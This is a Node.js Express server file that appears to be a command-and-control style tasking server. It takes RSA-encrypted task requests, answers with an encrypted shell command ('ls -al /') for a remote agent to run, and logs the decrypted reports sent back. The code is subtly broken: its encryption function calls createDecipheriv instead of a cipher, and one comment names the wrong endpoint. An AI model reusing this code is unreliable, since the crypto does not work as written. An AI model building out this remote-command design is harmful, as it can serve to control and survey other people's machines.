import express from "express";
import bodyParser from "body-parser";
import crypto from "crypto";

const app = express();
const port = SERVER_PORT;
const private_key = PRIVATE_KEY;
const algo = CRYPTO_ALGO;

const taskRequestToSymKey = {};

// Decrypt base64-encoded encrypted object to JSON object
function symmetricDecrypt({ iv, data }, symkey) {
  if (typeof symkey == "string") {
    symkey = Buffer.from(symkey, "base64");
  }
  if (typeof iv == "string") {
    iv = Buffer.from(iv, "base64");
  }
  const cipher = crypto.createDecipheriv(algo, symkey, iv);
  const decryptedResponse =
    cipher.update(data, "base64", "utf8") + cipher.final("utf8");
  return JSON.parse(decryptedResponse);
}

function symmetricEncrypt(json, symkey) {
  const iv = crypto.randomBytes(16);
  if (typeof symkey == "string") {
    symkey = Buffer.from(symkey, "base64");
  }
  const cipher = crypto.createDecipheriv(algo, symkey, iv);
  return {
    data:
      cipher.update(JSON.stringify(json), "utf8", "base64") +
      cipher.final("base64"),
    iv: iv.toString("base64"),
  };
}

function pubkeyDecrypt({ data }) {
  return JSON.parse(
    crypto.privateDecrypt(
      {
        key: private_key,
        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: "sha256",
      },
      Buffer.from(data, "base64")
    )
  );
}

// Middleware to parse JSON data
app.use(bodyParser.json());

app.post("/task", (req, res) => {
  console.log("Received encrypted task request: ", req.body);
  const taskRequest = pubkeyDecrypt(req.body);

  console.log(taskRequest);

  const response = {
    task_id: taskRequest.task_id,
    command: "ls -al /",
  };

  taskRequestToSymKey[taskRequest.task_id] = taskRequest.symkey;

  res.status(200).json(symmetricEncrypt(response, taskRequest.symkey));
});

// Endpoint to handle JSON data at /poll
app.post("/report", (req, res) => {
  const { data, iv, task_id } = req.body;

  const symkey = taskRequestToSymKey[task_id];

  const report = symmetricDecrypt({ iv, data }, symkey);

  console.log("Received task report:", report);

  res.status(200).end();
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
